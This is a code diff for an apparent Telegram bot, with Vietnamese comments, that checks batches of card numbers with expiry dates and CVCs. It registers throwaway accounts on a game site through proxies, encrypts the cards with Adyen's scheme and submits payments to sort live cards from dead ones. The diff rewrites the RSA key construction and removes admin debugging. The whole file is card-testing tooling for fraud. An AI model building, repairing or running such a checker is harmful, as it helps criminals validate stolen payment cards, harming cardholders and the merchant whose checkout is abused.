@@ -29,9 +29,9 @@ try:
     from Cryptodome.PublicKey import RSA
     from Cryptodome.Cipher import PKCS1_OAEP, AES
     from Cryptodome.Util.Padding import pad
-    from jose import jwk
+    from Cryptodome.Util.number import bytes_to_long
 except ImportError:
-    print("Thiếu thư viện crypto! Vui lòng chạy: pip install pycryptodomex python-jose")
+    print("Thiếu thư viện crypto! Vui lòng chạy: pip install pycryptodomex")
     sys.exit()
 
 # ===================================================================
@@ -113,7 +113,7 @@ def is_user_allowed(user_id):
     return user_id in users
 
 # ===================================================================
-# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0
+# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0 (FIXED)
 # ===================================================================
 
 def get_current_timestamp():
@@ -172,12 +172,22 @@ class AdyenV4_8_0:
         return self.key_object
 
     def encrypt_data(self, plain_text):
-        public_key = jwk.construct(self.key_object)
-        pem = public_key.to_pem().decode('utf-8')
-        rsa_key = RSA.import_key(pem)
+        # --- FIX: Sử dụng Cryptodome trực tiếp để dựng key, loại bỏ python-jose ---
+        def decode_base64url(val):
+            val += '=' * (-len(val) % 4)
+            return base64.urlsafe_b64decode(val)
+
+        n_val = bytes_to_long(decode_base64url(self.key_object['n']))
+        e_val = bytes_to_long(decode_base64url(self.key_object['e']))
+        
+        # Dựng RSA Key trực tiếp từ n và e
+        rsa_key = RSA.construct((n_val, e_val))
+        
+        # Thực hiện mã hóa
         random_bytes = os.urandom(64)
         cipher_rsa = PKCS1_OAEP.new(rsa_key)
         encrypted_key = cipher_rsa.encrypt(random_bytes)
+        
         cek = random_bytes
         protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
         protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
@@ -450,16 +460,16 @@ async def get_bin_info(session, cc_num):
     except Exception:
         return "BIN ERROR"
 
-async def check_card_core(line, user_id, session_semaphore=None):
-    """
-    Updated: Thêm tham số user_id để phân quyền debug
-    """
+async def check_card_core(line, session_semaphore=None):
     global CURRENT_OFFER_INDEX
     
     current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX, OFFER_MAP[1])
     price_val = current_config["price"]
     offer_id = current_config["id"]
 
+    # --- [IMPROVED TIME CHECK] ---
+    # Không khởi tạo start_time ở đây nữa để tránh tính thời gian chờ queue
+    
     line = line.strip()
     result = {
         "status": "ERROR",
@@ -483,11 +493,11 @@ async def check_card_core(line, user_id, session_semaphore=None):
     if session_semaphore:
         async with session_semaphore:
             # Chỉ bắt đầu tính giờ bên trong _execute_check
-            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id)
+            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
     else:
-        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id)
+        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
 
-async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id):
+async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
     # --- [IMPROVED TIME CHECK] ---
     # Bắt đầu tính giờ tại đây (khi thread thực sự chạy)
     start_time = time.time()
@@ -496,19 +506,12 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id):
     max_retries = 20
     impersonate_ver = "chrome120"
     
-    # Biến lưu debug cho Admin
-    last_debug_info = None
-
     while retry_count < max_retries:
         try:
             async with AsyncSession(impersonate=impersonate_ver, proxies=PROXIES_CONFIG, verify=False) as session:
                 # --- BƯỚC 1: LẤY TOKEN ---
                 reg_headers = {'accept': '*/*', 'referer': 'https://taongafarm.com/en/'}
                 resp_token = await session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
-                
-                if resp_token.status_code != 200 and user_id == ADMIN_ID:
-                    last_debug_info = f"STEP 1 ERROR\nStatus: {resp_token.status_code}\nBody: {resp_token.text[:3000]}"
-
                 match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
                 if not match:
                     retry_count += 1
@@ -531,10 +534,6 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id):
                 api_headers.update({'x-csrf-token': token, 'content-type': 'application/json'})
                 
                 resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=api_headers, json=reg_data, timeout=15)
-                
-                if resp_reg.status_code != 200 and user_id == ADMIN_ID:
-                    last_debug_info = f"STEP 2 ERROR\nStatus: {resp_reg.status_code}\nBody: {resp_reg.text[:3000]}"
-
                 if 'session_portal' not in session.cookies.get_dict():
                     retry_count += 1
                     continue
@@ -586,20 +585,10 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id):
                         "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|500|Card Not Supported - Time: {time_taken}s",
                         "bin_info": "UNK"
                     }
-                
-                # --- NẾU LỖI HTTP KHÁC 200 MÀ KHÔNG PHẢI 500 ---
-                if resp_pay.status_code != 200:
-                    if user_id == ADMIN_ID:
-                        # Lưu lại response text để gửi cho admin nếu cần
-                        last_debug_info = f"PAYMENT ERROR\nStatus: {resp_pay.status_code}\nBody: {resp_pay.text[:3000]}"
-                    retry_count += 1
-                    continue
 
                 try:
                     data = resp_pay.json()
                 except:
-                    if user_id == ADMIN_ID:
-                        last_debug_info = f"JSON ERROR\nStatus: {resp_pay.status_code}\nBody: {resp_pay.text[:3000]}"
                     retry_count += 1
                     continue
 
@@ -639,9 +628,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id):
                     "bin_info": bin_info_str
                 }
 
-        except Exception as e:
-            if user_id == ADMIN_ID:
-                last_debug_info = f"EXCEPTION: {str(e)}"
+        except Exception:
             retry_count += 1
             await asyncio.sleep(0.5)
             continue
@@ -650,18 +637,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id):
     # Tính thời gian ngay cả khi lỗi timeout để biết proxy chậm thế nào
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
-    
-    error_response = {
-        "status": "ERROR",
-        "is_live": False,
-        "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error - Time: {time_taken}s"
-    }
-    
-    # Nếu là Admin và có debug info, đính kèm vào kết quả trả về
-    if user_id == ADMIN_ID and last_debug_info:
-        error_response["admin_debug"] = last_debug_info
-        
-    return error_response
+    return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error - Time: {time_taken}s"}
 
 # ===================================================================
 # === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT (NON-BLOCKING)
@@ -682,7 +658,6 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     Hàm xử lý chạy ngầm, không block main thread
     """
     global CURRENT_OFFER_INDEX
-    user_id = update.effective_user.id
     
     total_cards = len(card_list)
     if total_cards == 0:
@@ -747,7 +722,7 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     ui_task = asyncio.create_task(update_ui_loop())
 
     async def worker(line):
-        res = await check_card_core(line, user_id, session_semaphore=semaphore)
+        res = await check_card_core(line, session_semaphore=semaphore)
         stats.checked += 1
         
         # BÁO LIVE TỨC THÌ
@@ -761,17 +736,6 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 )
                 await context.bot.send_message(chat_id=chat_id, text=msg_live)
             except: pass
-        
-        # --- BÁO DEBUG CHO ADMIN NẾU LỖI ---
-        if res["status"] == "ERROR" and user_id == ADMIN_ID and "admin_debug" in res:
-             try:
-                # Gửi full log (cắt ngắn 3500 ký tự để tránh lỗi Telegram)
-                debug_text = res["admin_debug"]
-                msg_debug = f"⚠️ **DEBUG INFO (ADMIN)**\nCard: `{line}`\n\n{debug_text}"
-                if len(msg_debug) > 3500:
-                    msg_debug = msg_debug[:3500] + "...(truncated)"
-                await context.bot.send_message(chat_id=chat_id, text=msg_debug)
-             except: pass
 
         async with file_lock:
             if res["is_live"]:
@@ -897,7 +861,6 @@ async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYP
             await update.message.reply_text("⚠️ Không tìm thấy thẻ hoặc sai định dạng.")
             return
 
-        user_id = update.effective_user.id
         current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX)
         card_data = cards[0]
         
@@ -908,9 +871,8 @@ async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYP
         # Đưa việc check vào task ngầm để bot lập tức rảnh tay nhận lệnh khác
         async def run_check():
             try:
-                result = await check_card_core(card_data, user_id)
+                result = await check_card_core(card_data)
                 
-                # --- XỬ LÝ KẾT QUẢ HIỂN THỊ ---
                 if "full_log" in result and "bin_info" in result:
                      base_log = result['full_log'].split(" - [")[0]
                      bin_info = result['bin_info']
@@ -923,12 +885,6 @@ async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYP
                                           f"⏱ {time_str}"
                 else:
                      formatted_response = result['full_log']
-                
-                # Nếu có lỗi và là Admin thì đính kèm debug info
-                if result['status'] == "ERROR" and user_id == ADMIN_ID and "admin_debug" in result:
-                    debug_text = result["admin_debug"]
-                    if len(debug_text) > 2000: debug_text = debug_text[:2000] + "..."
-                    formatted_response += f"\n\n⚠️ **DEBUG:**\n{debug_text}"
 
                 await msg.edit_text(formatted_response)
             except Exception as e:
